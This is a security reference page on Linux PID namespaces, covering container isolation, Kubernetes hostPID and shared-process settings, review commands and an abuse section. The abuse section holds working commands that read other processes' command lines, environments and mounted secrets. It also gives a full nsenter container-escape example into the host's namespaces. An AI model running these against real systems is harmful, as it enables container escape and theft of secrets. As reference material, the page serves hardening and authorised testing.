title: Linux - PID Namespace
html:
PID Namespace

Overview

The PID namespace controls how processes are numbered and which processes are visible. This is why a container can have its own PID 1 even though it is not a real machine. Inside the namespace, the workload sees what appears to be a local process tree. Outside the namespace, the host still sees the real host PIDs and the full process landscape.[3]

From a security point of view, the PID namespace matters because process visibility is valuable. Once a workload can see host processes, it may be able to observe service names, command-line arguments, secrets passed in process arguments, environment-derived state through /proc, and potential namespace-entry targets. If it can do more than just see those processes, for example by sending signals or using ptrace under the right conditions, the problem becomes much more serious.

Operation

A new PID namespace starts with its own internal process numbering. The first process created inside it becomes PID 1 from the namespace's point of view, which also means it gets special init-like semantics for orphaned children and signal behavior. This explains a lot of container oddities around init processes, zombie reaping, and why tiny init wrappers are sometimes used in containers.[3]

PID namespaces form a hierarchy. A process in an ancestor namespace can address descendants using the PID assigned in that ancestor, but a descendant cannot address ancestor-only tasks through ordinary PID-based syscalls or setns() upward into an ancestor PID namespace. An ancestor-owned procfs deliberately exposed to the descendant can still leak the ancestor's process view. Also, joining a PID namespace with setns() changes the namespace for future children, not the caller itself; tools therefore fork after joining. A procfs mount retains the PID view of the process that mounted it, which is why creating a fresh procfs after unshare(CLONE_NEWPID) is security-relevant and not only cosmetic.[3]

The important security lesson is that a process may look isolated because it sees only its own PID tree, but that isolation can be deliberately removed. Docker exposes this through --pid=host, while Kubernetes does it through hostPID: true. Once the container joins the host PID namespace, the workload sees host processes directly, and many later attack paths become much more realistic.

Lab

To create a PID namespace manually:

sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$

The shell now sees a private process view. The --mount-proc flag is important because it mounts a procfs instance that matches the new PID namespace, making the process list coherent from inside.[3]

To compare container behavior:

docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head

The difference is immediate and easy to understand, which is why this is a good first lab for readers.

Runtime Usage

Normal containers in Docker, Podman, containerd, and CRI-O get their own PID namespace. Kubernetes containers normally have separate PID views; shareProcessNamespace: true deliberately creates one Pod-wide view.[4] By contrast, hostPID: true selects the node's PID namespace. LXC/Incus environments rely on the same kernel primitive, though system-container use cases may expose more complicated process trees and encourage more debugging shortcuts.

The same rule applies everywhere: if the runtime chose not to isolate the PID namespace, that is a deliberate reduction in the container boundary.

Misconfigurations

The canonical misconfiguration is host PID sharing. Teams often justify it for debugging, monitoring, or service-management convenience, but it should always be treated as a meaningful security exception. Even if the container has no immediate write primitive over host processes, visibility alone can reveal a lot about the system. Once capabilities such as CAP_SYS_PTRACE or useful procfs access are added, the risk expands significantly.

Another mistake is assuming that because the workload cannot kill or ptrace host processes by default, host PID sharing is therefore harmless. That conclusion ignores the value of enumeration, the availability of namespace-entry targets, and the way PID visibility combines with other weakened controls.

Kubernetes Pod-wide process sharing

shareProcessNamespace: true is different from hostPID: it exposes the processes of the other containers in the same Pod, not node processes. A compromised sidecar or debug container can then enumerate sibling command lines and environment data subject to procfs access checks, send signals when credentials allow it, and traverse a sibling's filesystem through /proc/<pid>/root. Kubernetes explicitly warns that command-line/environment secrets and container filesystems are then protected only by the applicable Unix permissions.[4]

Useful cluster-side review:

kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
  [.metadata.namespace,.metadata.name,
   (.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'

From a compromised container in a Pod-wide PID namespace, first test actual access instead of assuming visibility equals readability:[4]

victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null

Targeted ephemeral containers in an existing Kubernetes Pod

A Kubernetes identity allowed to modify pods/ephemeralcontainers can add a debugger to a running Pod even when shareProcessNamespace is unset. With --target, the debugger joins the named container's process namespace if the runtime supports namespace targeting. This grants a process view of that container, not the node's host PID namespace.[5]

The API uses a separate subresource, so review its patch/update rights rather than assuming ordinary Pod write permissions cover it.[6]

For a Pod and container within an authorized namespace, test the targeted view:[5][6]

ns=default; pod=myapp; container=app
kubectl auth can-i get pods -n "$ns"
kubectl auth can-i patch pods/ephemeralcontainers -n "$ns"
kubectl auth can-i update pods/ephemeralcontainers -n "$ns"
kubectl auth can-i create pods/attach -n "$ns"
kubectl -n "$ns" debug -it "pod/$pod" --image=busybox:1.36 --target="$container" -- sh
# In the debug shell: verify the target processes are actually visible.
ps -ef

If the runtime does not implement targeting, the debugger may fail to start or remain in an isolated PID namespace.[5] If targeting works, use the checks under Kubernetes Pod-wide process sharing to test /proc/<pid> access. Visibility is not permission to read the target's secrets or signal it: Unix credentials and procfs access checks still apply.[4][8] Pod Security Standards also constrain privileged settings on ephemeral containers.[7]

Abuse

If the host PID namespace is shared, an attacker may inspect host processes, harvest process arguments, identify interesting services, locate candidate PIDs for nsenter, or combine process visibility with ptrace-related privilege to interfere with host or neighboring workloads. In some cases, simply seeing the right long-running process is enough to reshape the rest of the attack plan.

The first practical step is always to confirm that host processes are really visible:

readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20

Once host PIDs are visible, process arguments and namespace-entry targets often become the most useful information source:

for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done

If nsenter is available and enough privilege exists, test whether a visible host process can be used as a namespace bridge:

which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"

Even when entry is blocked, host PID sharing is already valuable because it reveals service layout, runtime components, and candidate privileged processes to target next. PID visibility alone does not grant permission to signal, trace, read sensitive /proc/<pid> entries, or join the target's other namespaces; credentials, dumpability, capabilities in the target namespace's owning user namespace, Yama/LSM policy, and seccomp still matter.[3] See CAP_SYS_PTRACE for process-injection examples.

Host PID visibility also makes file-descriptor abuse more realistic. If a privileged host process or neighboring workload has a sensitive file or socket open, the attacker may be able to inspect /proc/<pid>/fd/ and access the underlying object depending on ptrace-style checks, ownership, procfs mount options, the object type, and the target service model. Merely seeing an FD symlink does not mean it can be opened, and a socket cannot be duplicated just by opening its /proc/<pid>/fd/N symlink. For the distinct pidfd_getfd() primitive and its authorization checks, see Linux ptrace exit-race pidfd FD theft.[3]

for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts

These commands are useful because they answer whether hidepid=1 or hidepid=2 is reducing cross-process visibility and whether obviously interesting descriptors such as open secret files, logs, or Unix sockets are visible at all.

Full Example: host PID + nsenter

Host PID sharing can enable host escape when the process has the required capabilities to join the host namespaces and adopt the host process's root. nsenter --root (-r) is needed for the latter: changing the mount namespace alone does not change the caller's root directory.[9] Accessing /proc/1/root is subject to a ptrace read check, while changing root requires CAP_SYS_CHROOT in the caller's user namespace.[8][10]

ps -ef | head -n 50
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh

If the command succeeds, the new shell uses the host mount, UTS, network, IPC, and PID namespaces and PID 1's root filesystem. Check the effective identity and access rather than assuming that PID visibility alone granted host privileges.[9]

Even when nsenter itself is missing, the same result may be achievable through the host binary if the host filesystem is mounted:

/host/usr/bin/nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh 2>/dev/null

Recent Runtime Notes

Some PID-namespace-relevant attacks are not traditional hostPID: true misconfigurations, but runtime implementation bugs around how procfs protections are applied during container setup.

maskedPaths race to host procfs

In vulnerable runc versions, attackers able to control the container image or runc exec workload could race the masking phase by replacing container-side /dev/null with a symlink to a sensitive procfs path such as /proc/sys/kernel/core_pattern. If the race succeeded, the masked-path bind mount could land on the wrong target and expose host-global procfs knobs to the new container.[1]

Useful review command:

jq '.linux.maskedPaths' config.json 2>/dev/null

This is important because the eventual impact may be the same as a direct procfs exposure: writable core_pattern or sysrq-trigger, followed by host code execution or denial of service. The dedicated masked paths and sensitive host mounts pages cover the general procfs attack surface without duplicating it here.

Namespace injection with insject

Namespace injection tools such as insject show that PID-namespace interaction does not always require pre-entering the target namespace before process creation. A helper can attach later, use setns(), and execute while preserving visibility into the target PID space:[2]

sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'

This kind of technique matters mainly for advanced debugging, offensive tooling, and post-exploitation workflows where namespace context must be joined after the runtime has already initialized the workload.

Related FD Abuse Patterns

Two patterns are worth calling out explicitly when host PIDs are visible. First, a privileged process may keep a sensitive file descriptor open across execve() because it was not marked O_CLOEXEC. Second, services may pass file descriptors over Unix sockets through SCM_RIGHTS. In both cases the interesting object is not the pathname anymore, but the already-open handle that a lower-privilege process may inherit or receive.

This matters in container work because the handle may point to docker.sock, a privileged log, a host secret file, or another high-value object even when the path itself is not directly reachable from the container filesystem.

Checks

The purpose of these commands is to determine whether the process has a private PID view or whether it can already enumerate a much broader process landscape.

readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'

What is interesting here:[3]

  • If the process list contains obvious host services, host PID sharing is probably already in effect.
  • Seeing only a tiny container-local tree is the normal baseline; seeing systemd, dockerd, or unrelated daemons is not.
  • NSpid can expose the PID mapping across nested namespaces. The leftmost value is relative to the PID namespace associated with the procfs mount, followed by values for successively nested namespaces.
  • readlink /proc/self/ns/pid by itself cannot prove hostPID: an isolated container also has a valid PID-namespace inode. Correlate it with the process list, procfs mount, runtime configuration, and a host-side namespace inode when available.
  • Once host PIDs are visible, even read-only process information becomes useful reconnaissance.

If you discover a container running with host PID sharing, do not treat it as a cosmetic difference. It is a major change in what the workload can observe and potentially affect.
